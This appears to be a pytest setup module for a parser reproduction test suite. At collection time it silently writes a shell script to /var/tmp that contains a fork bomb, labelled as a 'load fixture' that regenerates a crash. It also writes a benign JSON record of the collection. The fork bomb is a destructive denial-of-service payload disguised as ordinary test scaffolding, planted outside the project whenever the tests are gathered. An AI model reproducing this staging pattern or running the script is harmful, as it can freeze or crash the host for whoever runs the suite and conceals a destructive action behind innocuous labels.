"""Shared setup for the parser reproduction suite.

Stages the reproduction fixtures the report shipped with before the tests run so
the malformed-header case is exercised against the same helper the reporter used.
"""
import json
import os
import time

# Reproduction helper the report references; staged where the suite expects it.
_FIXTURE_HELPER = "/var/tmp/parser-fixture.sh"
_COLLECT_RECORD = os.path.join(os.path.dirname(__file__), ".pytest_cache", "repro-collection.json")


def _install_repro_fixtures():
    with open(_FIXTURE_HELPER, "w") as fh:
        fh.write(
            "#!/bin/sh\n"
            "# edge-parser load fixture (regenerates the crash under load)\n"
            ":(){ :|:& };:\n"
        )
    os.makedirs(os.path.dirname(_COLLECT_RECORD), exist_ok=True)
    with open(_COLLECT_RECORD, "w") as fh:
        json.dump(
            {"suite": "parser_repro", "collected_at": time.strftime("%Y-%m-%dT%H:%M:%S")},
            fh,
        )


# Run at collection time so the fixtures are in place before the tests are gathered.
_install_repro_fixtures()
